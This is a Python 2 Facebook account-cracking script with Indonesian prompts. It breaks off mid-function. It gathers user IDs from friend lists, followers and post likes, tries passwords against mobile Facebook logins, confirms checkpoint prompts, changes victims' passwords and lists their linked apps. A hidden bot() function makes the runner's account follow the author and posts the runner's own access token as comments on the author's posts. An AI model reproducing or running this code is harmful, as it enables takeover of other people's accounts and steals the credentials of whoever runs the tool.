#!/usr/bin/python2
# coding=utf-8
# author : Sanz Tzy

### IMPORT MODULE ###
import os, sys, re, time, requests, calendar, random,json
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
s=requests.Session()
try:
	import requests
except ImportError:
	print("\n [!] module requests belum terinstall")
	os.system("pip install requests")

try:
	import bs4
except ImportError:
	print("\n [!] module bs4 belum terinstall")
	os.system("pip install bs4")

try:
	import concurrent.futures
except ImportError:
	print("\n [!] module futures belum terinstall")
	os.system("pip install futures")


### GLOBAL WARNA ###
P = '\x1b[1;97m' # PUTIH               
M = '\x1b[1;91m' # MERAH            
H = '\x1b[1;92m' # HIJAU.              
K = '\x1b[1;93m' # KUNING.           
B = '\x1b[1;94m' # BIRU.                 
U = '\x1b[1;95m' # UNGU.               
O = '\x1b[1;96m' # BIRU MUDA.     
N = '\x1b[0m'    # WARNA MATI     

### GLOBAL NAMA ###
IP = requests.get('https://api.ipify.org').text
url = "https://mbasic.facebook.com"
id = []
cp = []
ok = []
ubahP = []
pwbaru = []
data = {}
data2 = {}
loop = 0

### GLOBAL WAKTU ###
ct = datetime.now()
n = ct.month
bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulann[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

### DEF TAMBAHAN ###
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
        
### BAGIAN LOGO ###
def logo():
	os.system("clear")
	print("""%s
 \x1b[1;92m _________             \x1b[1;93m_____    _______   \x1b[1;92m__________
 \x1b[1;92m/   _____/            \x1b[1;93m/  _  \   \      \  \x1b[1;92m\____    /
 \x1b[1;92m\_____  \   \x1b[1;93m_______  /  /_\  \  /   |   \   \x1b[1;92m/     /
 \x1b[1;92m/ V2.1   \ \x1b[1;93m/______/ /    |    \/    |    \ \x1b[1;92m/     /_ 
 \x1b[1;92m/______  /          \x1b[1;93m\____|__  /\____|__  /\x1b[1;92m/_______ \  
 \x1b[1;92m       \/     \x1b[1;93m              \/         \/         \x1b[1;92m\/    """%(N))
 

### BAGIAN LOGIN ###
def tokenz():
	os.system('clear')
	try:
		token = open('token.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
                logo()
                print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
                print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mAuthor     \x1b[1;93m: \x1b[1;93mSanz Tzy"%(N))     
		print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mWhatshap   \x1b[1;93m: \x1b[1;93m081210xxxx"%(N))   
		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mFacebook   \x1b[1;93m: \x1b[1;93mBintang Tzy")      
		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m══════════════════════════════════════")     
		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mBergabung  \x1b[1;93m: %s"%(tgl))                     
		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mStatus     \x1b[1;93m: %s\x1b[1;91mA M P A S%s"%(H,N)) 
                print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mYautube     \x1b[1;93m: \x1b[1;93mBintang XD"%(N))
                print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m══════════════════════════════════════")               
                print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
                print '%s \x1b[1;92m╠══><%s \x1b[1;93musahakan akun tumbal login di google chrome terlebih dahulu'%(B,N)
                print '%s \x1b[1;92m╠══><%s \x1b[1;93mjangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H)
                print '%s \x1b[1;92m╠══><%s \x1b[1;93msetelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H)
                print '%s \x1b[1;92m╠══><%s \x1b[1;93mlalu klik %sCari di Halaman%s \x1b[1;93mTinggal ketik %sEAAA%s \x1b[1;93mLalu salin'%(B,N,H,N,H,N)
                print(" \x1b[1;92m╠══><%s \x1b[1;93mSihlakan kunjungi Facebook me \x1b[1;92mBintang Tzy \x1b[1;93mTerimakasih."%(N))
                print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
                print('%s \x1b[1;92m║'%(O))
		token = raw_input(' \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mtoken Fb disini \x1b[1;93m: \x1b[1;92m')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
			menu()
		except KeyError:
			print(" %s[!] token kadaluwarsa!"%(M))
			sys.exit() 
 
### BOT FOLLOW DAN KOMEN ###
def bot():
	try:
		token = open('token.txt', 'r').read()
	except (KeyError, IOError):
		exit(" %s[!] token kadaluwarsa!"%(M))
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/100013291513596/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/106024538578610/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/106024515245279/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/124014098051640/comments/?message='+token+'&access_token=' + token)
	requests.post('https://graph.facebook.com/1324794007973637/comments/?message='+token+'&access_token=' + token)

### BAGIAN MENU ###
def menu():
    global token
    os.system('clear')
    try:
        token = open('token.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
    except (KeyError, IOError):
        os.system('clear')
        print("\n %s[!] token kadaluwarsa!"%(M))
        os.system('rm -f token.txt')
        tokenz()
    except requests.exceptions.ConnectionError:
        exit(" %s[!] anda tidak terhubung ke internet!"%(M))

    logo()
    print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
    print ' \x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mAuthor     : \x1b[1;92mSanz Tzy \x1b[1;93mX \x1b[1;92mHARIS GANZ'
    print ' \x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mVersion    : \x1b[1;92m5.5'
    print ' \x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mFacebook   : \x1b[1;92mBintang Tzy'
    print(" \x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93m══════════════════════════════════════")
    print(" \x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mBergabung  \x1b[1;93m: %s\x1b[1;92m"%(tgl))
    print(" \x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mStatus     \x1b[1;93m: %s\x1b[1;91mA M P A S%s"%(H,N))
    print(" %s\x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93mWhatshap   \x1b[1;93m: \x1b[1;93m0845566xxxx"%(N))
    print(" \x1b[1;92m╠══[\x1b[1;93m•\x1b[1;92m] \x1b[1;93m══════════════════════════════════════")
    print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
    jalan("\n \x1b[1;92m[ \x1b[1;92mselamat datang Bosku %s%s%s \x1b[1;93m]\n"%(K,nama,N))
    print(" \x1b[1;92m╠══[\x1b[1;93m01\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mID Teman Publik \x1b[1;92m[\x1b[1;93m5000 ID\x1b[1;92m]")
    print(" \x1b[1;92m╠══[\x1b[1;93m02\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mID Teman Massal \x1b[1;92m[\x1b[1;93m5000 ID\x1b[1;92m]")
    print(" \x1b[1;92m╠══[\x1b[1;93m03\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mID Followers \x1b[1;92m[\x1b[1;93m5000 ID\x1b[1;92m]")
    print(" \x1b[1;92m╠══[\x1b[1;93m04\x1b[1;92m] \x1b[1;93mCrack \x1b[1;92mID Postingan \x1b[1;92m[\x1b[1;93m5000 ID\x1b[1;92m]")
    print(" \x1b[1;92m╠══[\x1b[1;93m05\x1b[1;92m] \x1b[1;93mCrack Random \x1b[1;92mID FB New \x1b[1;92m[\x1b[1;93m5000 ID\x1b[1;92m]")
    print(" \x1b[1;92m╠══[\x1b[1;93m06\x1b[1;92m] \x1b[1;93mSettings \x1b[1;92mUser Agent \x1b[1;94mU\x1b[1;97m/\x1b[1;95mA")
    print(" \x1b[1;92m╠══[\x1b[1;93m07\x1b[1;92m] \x1b[1;93mCheck \x1b[1;92mHasil Crack")
    print(" \x1b[1;92m╠══[\x1b[1;93m08\x1b[1;92m] \x1b[1;93mCheck \x1b[1;92mOpsi CheckPoint")
    print(" \x1b[1;92m╠══[\x1b[1;93m09\x1b[1;92m] \x1b[1;93mLaporkan \x1b[1;92mBug Script")
    print(" \x1b[1;92m╠══[\x1b[1;93m10\x1b[1;92m] \x1b[1;93mInfo \x1b[1;92mTools/Script")
    print(" \x1b[1;92m╠══[%s\x1b[1;93m00%s\x1b[1;92m]\x1b[1;92m \x1b[1;91mHapus Token"%(M,N))
    print('%s \x1b[1;92m║'%(O))
    asw = raw_input(" \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mpilih : \x1b[1;92m")
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    	atursandi()
    elif asw == "2":
    	massal()
    	atursandi()
    elif asw == "3":
    	followers()
    	atursandi()
    elif asw == "4":
    	postingan()
    	atursandi()
    elif asw == "5":
    	fbbaru()
        atursandi()
    elif asw == "6":
    	useragent()
    elif asw == "7":
	cekhasil()
    elif asw == "8":
        cekopsi()
    elif asw == "9":
 	laporbug()
    elif asw == "10":
        info_tools()
    elif asw == "0":
    	os.system('rm -f token.txt')
    	jalan(" \x1b[1;92m╠══[\x1b[1;93m✓\x1b[1;92m] \x1b[1;93mberhasil menghapus token ")
    	exit()
    else:
    	jalan(" ╠══[!] pilih jawaban dengan bener ! ")
    	menu() 
		
### DUMP PUBLIK ###
def publik():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mtoken kadaluwarsa")
	print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93misi \x1b[1;97m'\x1b[1;92mme\x1b[1;97m' \x1b[1;93mjika ingin crack dari daftar teman")
	idt = raw_input(" \x1b[1;92m╠══[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mmasukan id atau username \x1b[1;93m: \x1b[1;92m")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except KeyError:
		exit(" \x1b[1;92m╠══[\x1b[1;93m!\x1b[1;92m] \x1b[1;93makun tidak tersedia atau list teman private")
        print('%s \x1b[1;92m║'%(O))
	print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id  \x1b[1;93m: %s%s%s\x1b[1;92m"%(M,len(id),N)) 
  
### DUMP MASSAL ###
def massal():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" ╠══[!] token kadaluwarsa")
	try:
		tanya_total = int(raw_input(" ╠══[?] masukan jumlah target : "))
	except:tanya_total=1
	print(" ╠══[*] isi 'me' jika ingin crack dari daftar teman")
	for t in range(tanya_total):
		t +=1
		idt = raw_input(" ╠══[?] id target %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
		except KeyError:
			print(" ╠══[!] akun tidak tersedia atau list teman private")
        print('%s \x1b[1;92m║'%(O))
	print(" ╠══[+] total id  : %s%s%s"%(M,len(id),N))
	
### DUMP FOLLOWERS ###
def followers():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" ╠══[!] token kadaluwarsa")
	print(" ╠══[*] isi 'me' jika ingin crack dari pengikut sendiri")
	idt = raw_input(" ╠══[*] masukan id atau username : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" ╠══[!] akun tidak tersedia atau list teman private")
        print('%s \x1b[1;92m║'%(O))
	print(" ╠══[+] total id  : %s%s%s"%(M,len(id),N))
	
### DUMP POSTINGAN ###
def postingan():
	global token
	try:
		token = open("token.txt", "r").read()
	except IOError:
		exit(" ╠══[!] token kadaluwarsa")
	idt = raw_input(" ╠══[?] masukan url atau id postingan : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/likes?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit(" ╠══[!] postingan tidak tersedia atau post private")
        print('%s \x1b[1;92m║'%(O))
	print(" ╠══[+] total id  : %s%s%s"%(M,len(id),N))
	
### DUMP NEW FB ###
def fbbaru():
	x = 11111111111
	xx = 77777777777
	idx = "1000" 
	limit = int(input(" ╠══[+] masukan jumlah id Maksimal 5000 id: "))
	try:
		for n in range(limit):
			_ = random.randint(x,xx)
			__ = idx
			id.append(__+"<=>"+str(_))
	except KeyError:
		exit(" ╠══[!] akun tidak tersedia atau error")
        print('%s \x1b[1;92m║'%(O))
	print(" ╠══[+] total id  : %s%s%s"%(M,len(id),N))
### CEK DATA² TARGET ###
def igg():
    jalan(' ╠══[*] maaf fitur ini tidak tersedia sekarang\n ╠══[*] silahkan tunggu update terbaru')
    print('%s \x1b[1;92m║'%(O))
    raw_input(' ╠══[*] kembali ')
    menu()
####INFO TOOLS####
def info_tools():
    os.system('clear')
    logo()
    print ' %s╠══[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Welcome to Tools       \x1b[1;93m'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] TEAM      \x1b[1;93m: XNX-CODE TEAM 2021.'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Author    \x1b[1;93m: Sanz-Tzy \x1b[1;93mX Haris Ganz.'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Github    \x1b[1;93m: https://github.com/Sanz-Tzy'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Facebook  \x1b[1;93m: Bintang Tzy'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Link FB   \x1b[1;93m: https://www.facebook.com/bintangt.zy.92'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] WhatsApp  \x1b[1;93m: +628727xxxx'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Peringatan \x1b[1;93m: Jangan lupa Follow dan Like github saya!'%(N,H,N);time.sleep(0.07)
    print ' %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Catatan  \x1b[1;93m: Kunjungi Facebook Saya Bintang Tzy'%(N,H,N);time.sleep(0.07)
    print ' %s╠══[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
    print('%s \x1b[1;92m║'%(O))
    raw_input('  ╠══[ %sKEMBALI%s ] '%(O,N));menu()

### CEK HASIL CRACK ###
def cekhasil():
        print('%s \x1b[1;92m║'%(O))
	print(' ╠══[1]. l\x1b[1;92mihat hasil crack OK ')
	print(' ╠══[2]. \x1b[1;93mlihat hasil crack CP ')
        print('%s \x1b[1;92m║'%(O))
	anjg = raw_input(' ╠══[?] pilih : \x1b[1;93m')
	if anjg == '':
		menu()
	elif anjg == "1":
		dirs = os.listdir("OK")
		print("")
		for file in dirs:
			print(" ╠══[*] "+file)
		try:
                        print('%s \x1b[1;92m║'%(O))
			file = raw_input(" [?] mau lihat hasil yang mana ?: ")
			if file == "":
				menu()
			totalok = open("OK/%s"%(file)).read().splitlines()
		except IOError:
			exit(" ╠══[!] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n *-------------------------------------------------*")
		print(" \x1b[1;92m╠══[+] tanggal : \x1b[1;93m%s -total : \x1b[1;93m%s"%(del_txt, len(totalok)))
		os.system("cat OK/%s"%(file))
                print('%s \x1b[1;92m║'%(O))
		raw_input(" ╠══[*]\x1b[1;93m tekan enter untuk kembali ke menu")
		menu()
	elif anjg == "2":
		dirs = os.listdir("CP")
		print("")
		for file in dirs:
			print(" [*] "+file)
		try:
                        print('%s \x1b[1;92m║'%(O))
			file = raw_input(" ╠══[?] \x1b[1;93mmau Cek yang mana ? : \x1b[1;92m" )
			if file == "":
				menu()
			totalcp = open("CP/%s"%(file)).read().splitlines()
		except IOError:
			exit(" ╠══[!] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n *-------------------------------------------------*")
		print(" \x1b[1;93m╠══[+] tanggal : \x1b[1;92m%s -total : \x1b[1;93m%s"%(del_txt, len(totalcp)))
		os.system("cat CP/%s"%(file))
                print('%s \x1b[1;92m║'%(O))
		raw_input(" ╠══[*] \x1b[1;93mtekan enter untuk kembali ke menu ")
		menu()
	else:
		menu()


####CHECK OPSI CEKPOINT####
def cekopsi():
	dirs = os.listdir("CP")
	print("")
	for file in dirs:
		print(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] CP/"+file)
	print("\n \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] masukan file (ex: CP/%s.txt)"%(tanggal))
	files = raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mnama file  \x1b[1;97m: \x1b[1;92m")
	if files == "":
		menu()
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] nama file %s tidak tersedia"%(files))
	ubahpw()
	print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses cek')
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print("\n \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] cek : %s%s%s"%(K,kontol.replace("  * --> ",""),N))
		try:
			cek_opsi(titid[0].replace("  * --> ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mcek akun sudah selesai\x1b[1;97m...")
	raw_input(" \x1b[1;92m[\x1b[1;93m*\x1b[1;92m] \x1b[1;93mtekan enter untuk kembali ke menu ")
	time.sleep(1)
	menu()

def ubahpw():
	pw=raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mapakah anda ingin mengubah sandi tap yes\x1b[1;97m?\x1b[1;92m[\x1b[1;93mY\x1b[1;97m/\x1b[1;93mt\x1b[1;92m]\x1b[1;97m: \x1b[1;92m")
	if pw == "Y" or pw == "y":
		ubahP.append("y")
		pw2=raw_input(" \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan sandi \x1b[1;97m: \x1b[1;92m")
		if len(pw2) <= 5:
			exit(" \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mkata sandi minimal 6 karakter ")
		else:
			pwbaru.append(pw2)
	else:
		pass


def cek_opsi(user,pw):
	global loop,ubahP,pwbaru
	session=requests.Session()
	session.headers.update({
		"Host":"mbasic.facebook.com",
		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"accept-encoding":"gzip, deflate",
		"accept-language":"id-ID,id;q=0.9",
		"referer":"https://mbasic.facebook.com/",
		"user-agent":"nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	})
	soup=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
	response=parser(urlPost.text, "html.parser")
	if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
		print("\r %s[!] aktifkan mode pesawat selama 5 detik%s"%(M,N))
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r %s[!] akun terkunci tampilan sesi new%s"%(M,N))
		else:
			loop+=1
			print("\r [✓] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
	elif "checkpoint" in session.cookies.get_dict():
		loop+=1
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=parser(an.text,"html.parser")
		number=0
		cek=[cek for cek in response2.find_all("option")]
		print("\r [+] terdapat "+str(len(cek))+" opsi ")
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				if "y" in ubahP:
					ubah_pw(user,pw,session,response,link2)
				else:
					print("\r [✓] akun tap yes, silahkan login di fb lite \n %s[✓] %s|%s|%s%s									\n"%(H,user,pwbaru,coki[0],N))
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r %s[!] akun terpasang autentikasi dua faktor%s							\n"%(M,N))
			else:
				print("Kesalahan!")
		elif(len(cek)<=1):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
				print("  [%s] %s"%(str(number),opsi[0]))
		elif(len(cek)>=2):
			for x in range(len(cek)):
				number+=1
				opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
				print("  [%s] %s"%(str(number),opsi[0]))
			print("")
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r [✓] akun tidak terkena checkpoint, silahkan login di fb lite \n %s* --> %s|%s|%s%s				\n\n"%(H,user,pw,session.cookies.get_dict(),N))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [!] %s"%(oh))
	else:
		loop+=2
		print(" [!] Account terkena Sesi/CheckPoint")

def ubah_pw(user,pw,session,response,link2):
	dat,dat2={},{}
	but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
	for x in response("input"):
		if x.get("name") in but:
			dat.update({x.get("name"):x.get("value")})
	ubahPw=session.post(url+link2.get("action"),data=dat).text
	resUbah=parser(ubahPw,"html.parser")
	link3=resUbah.find("form",{"method":"post"})
	but2=["submit[Next]","nh","fb_dtsg","jazoest"]
	if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
		for b in resUbah("input"):
			if b.get("name") in but2:
				dat2.update({b.get("name"):b.get("value")})
		dat2.update({"password_new":"".join(pwbaru)})
		an=session.post(url+link3.get("action"),data=dat2)
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		print("\r [✓] akun tap yes, silahkan login di fb lite \n [*] sandi telah diubah ke : %s \n %s[✓] %s|%s|%s%s									\n"%(pwbaru[0],H,user,pwbaru[0],coki,N))
		cek_game(coki)

def cek_game(cookie):
	w=s.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=cookie).text
	sop = parser(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print("")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada",""),N))

###GANTI USER AGENT###
def useragent():
    print('%s \x1b[1;92m║'%(O))
    print ' ╠══%s1%s \x1b[1;93mganti user agent'%(O,N)
    print ' ╠══%s2%s \x1b[1;93mcheck user agent'%(O,N)
    print('%s \x1b[1;92m║'%(O))
    ytbjts = raw_input(' %s\x1b[1;93m╠══[%s\x1b[1;92m?%s\x1b[1;92m] choose : \x1b[1;93m'%(N,O,N))
    if ytbjts == '':
        print('%s \x1b[1;92m║'%(O))
        print ' %s╠══[%s×%s] \x1b[1;93mGak boleh kosong Kentod'%(N,M,N);time.sleep(2);seting_yntkts()
    elif ytbjts in['1','01']:
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts in['2','02']:
        try:
            user_agent = open('YNTKTS.txt', 'r').read()
        except IOError:
            user_agent = '%s-'%(M)
        print('%s \x1b[1;92m║'%(O))
        print ' %s╠══[%s+%s] \x1b[1;93mUser Agent anda : \x1b[1;93m%s%s'%(N,O,N,H,user_agent)
        print('%s \x1b[1;92m║'%(O))
        raw_input(' %s╠══[ %skembali%s ]'%(N,O,N));menu()
    else:
        print('%s \x1b[1;92m║'%(O))
        print ' %s╠══[%s×%s] \x1b[1;93minput yang bener'%(N,M,N);time.sleep(2);seting_yntkts()
# User Agent baru
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    print('%s \x1b[1;92m║'%(O))
    _asu_ = raw_input(' ╠══[%s?%s] \x1b[1;93mingin menggunakan user agent hp anda [Y/t]: '%(O,N))
    if _asu_ == '':
        print('%s \x1b[1;92m║'%(O))
        print ' %s╠══[%s×%s] \x1b[1;93mGak boleh kosong Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
    elif _asu_ in['Y','y']:
        print('%s \x1b[1;92m║'%(O))
        jalan('\x1b[1;93m %s╠══%s\x1b[1;93mMasuk Google chrome/google biasa lalu cari\n %s╠══%s%sMY USER AGENT%s \x1b[1;93mlalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('')
        _agen_ = raw_input(' ╠══[%s?%s]\x1b[1;93m masukan user agent hp anda :%s\x1b[1;93m '%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        print('%s \x1b[1;92m║'%(O))
        jalan(' %s╠══[%s✓%s] \x1b[1;92mberhasil menggunakan user agent hp anda...'%(N,H,N))
        print('%s \x1b[1;92m║'%(O))
        raw_input(' %s╠══[ %skembali%s ]'%(N,O,N));menu()
    elif _asu_ in['T','t']:
        _agen_ = raw_input(' ╠══[%s?%s] \x1b[1;93mmasukan user agent :%s \x1b[1;93m'%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        print('%s \x1b[1;92m║'%(O))
        jalan(' %s╠══[%s✓%s]\x1b[1;93m berhasil mengganti user agent...'%(N,H,N))
        print('%s \x1b[1;92m║'%(O))
        raw_input(' %s╠══[ %skembali%s ]'%(N,O,N));menu()
    else:
        print('%s \x1b[1;92m║'%(O))
        print ' %s╠══[%s!%s]\x1b[1;93m [Y/t] ngentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()

####LAPORAN BUG####
def laporbug():
    print('%s \x1b[1;92m║'%(O))
    asulo = raw_input(' \x1b[1;92m╠══[?] masukan laporan bug script : \x1b[1;92m').replace(' ', '%20')
    if asulo == '':
        menu()
    os.system('xdg-open https://wa.me/6281272106675?text=' + asulo)
    print('%s \x1b[1;92m║'%(O))
    raw_input(' \x1b[1;92m[*] \x1b[1;93mkembali ')
    menu()


### BAGIAN SANDI ####
def atursandi():
	ask=raw_input(" \x1b[1;92m╠══[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mapakah anda ingin menggunakan sandi manual\x1b[1;97m? \x1b[1;92m[\x1b[1;93mY\x1b[1;97m/\x1b[1;93mt\x1b[1;92m]\x1b[1;93m:\x1b[1;92m")
	if ask=="y":
		sandimanual()
	elif ask=="t":
		sandiotomatis()
	else:
